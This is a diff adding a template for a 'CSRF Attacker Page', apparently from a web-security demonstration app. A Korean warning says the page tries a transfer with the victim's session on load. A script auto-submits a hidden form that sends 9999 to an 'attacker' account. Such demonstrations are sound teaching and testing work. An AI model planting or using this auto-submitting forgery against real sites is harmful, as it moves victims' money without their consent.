@@ -1,0 +1,16 @@
+{% extends "base.html" %}
+{% block title %}CSRF Attacker{% endblock %}
+{% block content %}
+<section class="panel">
+    <h2>CSRF Attacker Page</h2>
+    <p class="warn">이 페이지는 로드되면 자동으로 피해자 세션으로 송금을 시도합니다.</p>
+    <form id="csrf-form" method="post" action="{{ target_url }}">
+        <input type="hidden" name="to_user" value="attacker">
+        <input type="hidden" name="amount" value="9999">
+        <button type="submit">Submit Manually</button>
+    </form>
+</section>
+<script>
+    document.getElementById("csrf-form").submit();
+</script>
+{% endblock %}
